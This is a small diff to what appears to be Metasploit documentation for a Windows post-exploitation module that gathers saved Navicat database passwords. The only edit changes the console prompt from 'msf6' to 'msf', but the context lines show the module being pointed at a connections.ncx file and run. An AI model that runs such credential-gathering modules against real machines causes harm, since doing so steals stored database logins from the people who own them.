@@ -46,9 +46,9 @@ meterpreter >
 * Specify **NCX_PATH**
 
 ```
-msf6 post(windows/gather/credentials/navicat) > set ncx_path C:\\Users\\FireEye\\Desktop\\connections.ncx
+msf post(windows/gather/credentials/navicat) > set ncx_path C:\\Users\\FireEye\\Desktop\\connections.ncx
 ncx_path => C:\Users\FireEye\Desktop\connections.ncx
-msf6 post(windows/gather/credentials/navicat) > run
+msf post(windows/gather/credentials/navicat) > run
 
 [*] Gathering Navicat password information from WIN-79MR8QJM50N
 [*] Looking for C:\Users\FireEye\Desktop\connections.ncx
